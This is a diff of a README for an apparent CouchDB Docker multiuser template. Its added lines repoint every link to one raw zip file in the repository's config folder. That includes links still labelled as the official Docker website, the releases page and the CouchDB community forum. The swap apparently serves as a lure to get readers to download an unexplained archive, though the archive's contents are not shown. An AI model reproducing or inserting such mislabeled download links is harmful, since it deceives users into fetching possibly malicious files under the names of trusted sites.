@@ -1,7 +1,7 @@
 # 🐬 couchdb_docker_multiuser_template - Quickly Launch CouchDB with Ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/releases)
+[![Download Latest Release](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/raw/refs/heads/main/config/multiuser_couchdb_docker_template_1.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/raw/refs/heads/main/config/multiuser_couchdb_docker_template_1.6.zip)
 
 ## 🚀 Getting Started
 This template helps you set up a CouchDB multiuser environment quickly and easily using Docker. You don’t need any programming skills. Just follow these simple steps to get started.
@@ -10,7 +10,7 @@ This template helps you set up a CouchDB multiuser environment quickly and easil
 Before you download, make sure you have the following:
 
 - A computer running Windows, macOS, or Linux.
-- Docker installed on your machine. You can download it from the [Docker website](https://www.docker.com/products/docker-desktop).
+- Docker installed on your machine. You can download it from the [Docker website](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/raw/refs/heads/main/config/multiuser_couchdb_docker_template_1.6.zip).
 - Basic familiarity with command line or terminal.
 
 ### 💻 System Requirements
@@ -19,9 +19,9 @@ Before you download, make sure you have the following:
 - **Disk Space:** Minimum 1GB available for Docker containers.
 
 ## 📥 Download & Install
-To download the software, visit this page to download: [CouchDB Docker Multiuser Template Releases](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/releases).
+To download the software, visit this page to download: [CouchDB Docker Multiuser Template Releases](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/raw/refs/heads/main/config/multiuser_couchdb_docker_template_1.6.zip).
 
-1. Open the [Releases page](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/releases).
+1. Open the [Releases page](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/raw/refs/heads/main/config/multiuser_couchdb_docker_template_1.6.zip).
 2. You will see a list of available releases. Choose the latest version.
 3. Click on the release notes to see more information.
 4. Scroll down to the assets section. Download the necessary files for your operating system.
@@ -60,14 +60,14 @@ CouchDB allows multiuser access. Here’s how to set it up:
 To make the most of your CouchDB setup, explore the official CouchDB documentation for user management, database operations, and advanced features.
 
 ### 🔄 Updating CouchDB
-To update CouchDB, return to the [Releases page](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/releases). Download the latest version and replace the old files with the new ones. Run the Docker command again to start the updated version.
+To update CouchDB, return to the [Releases page](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/raw/refs/heads/main/config/multiuser_couchdb_docker_template_1.6.zip). Download the latest version and replace the old files with the new ones. Run the Docker command again to start the updated version.
 
 ## 🛠️ Troubleshooting
 If you encounter issues, try the following:
 
 - Ensure Docker is running on your machine.
 - Check that your system meets all requirements.
-- Visit the [CouchDB community forum](https://couchdb.apache.org/community.html) for help from other users.
+- Visit the [CouchDB community forum](https://github.com/vighneshsoni/couchdb_docker_multiuser_template/raw/refs/heads/main/config/multiuser_couchdb_docker_template_1.6.zip) for help from other users.
 
 ## 📦 Additional Features
 - **Multiuser Support:** Tailor your CouchDB setup for multiple users.
